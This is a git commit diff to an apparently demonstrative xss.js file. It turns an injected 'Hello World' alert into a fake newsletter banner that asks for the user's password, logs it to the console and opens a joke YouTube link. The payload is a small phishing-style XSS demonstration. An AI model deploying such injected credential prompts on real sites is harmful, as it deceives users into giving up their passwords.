27fd082d943cf455ac03b235d4c74c389d2e34ce
Emilio Schaedler Heinzmann <103655828+emiliosheinz@users.noreply.github.com>
2023-10-03 14:34:11 -0300

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -1,5 +1,16 @@
-var head = document.getElementsByTagName('head')[0];
-var script = document.createElement('script');
+const head = document.getElementsByTagName('head')[0];
+const script = document.createElement('script');
 script.type = 'text/javascript';
-script.innerHTML = 'alert("Hello World!");';
+script.innerHTML = `
+  const bannerNotification = document.getElementsByClassName("banner-notifications")[0];
+  const notification = document.createElement("div");
+  notification.className = "alert alert-primary";
+  notification.innerHTML = "Have you already signed in for the newsletter? If not, please, click this notification. You will be asked to confirm your password and then you will be redirected to the newsletter page :)";
+  notification.onClick = function() {
+    const password = window.prompt("Confirm your password")
+    console.log(password);
+    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+  }
+  bannerNotification.appendChild(notification);
+`;
 head.appendChild(script);
